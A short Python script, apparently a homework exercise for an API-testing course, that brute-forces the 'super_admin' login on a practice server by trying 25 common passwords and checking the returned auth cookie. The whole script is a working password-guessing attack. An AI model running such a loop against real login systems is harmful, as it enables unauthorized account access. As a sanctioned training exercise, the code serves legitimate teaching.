import requests

passwords = ["123456",
             "123456789",
             "qwerty",
             "password",
             "1234567",
             "12345678",
             "12345",
             "iloveyou",
             "111111",
             "123123",
             "abc123",
             "qwerty123",
             "1q2w3e4r",
             "admin",
             "qwertyuiop",
             "654321",
             "555555",
             "lovely",
             "7777777",
             "welcome",
             "888888",
             "princess",
             "dragon",
             "password1",
             "123qwe"]


for password in passwords:
    data = {
        "login": "super_admin",
        "password": f"{password}"
    }
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=data)
    cookies = response.cookies
    response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response.text == "You are authorized":
        print(f"You are authorized, ваш пароль '{password}'")
        break
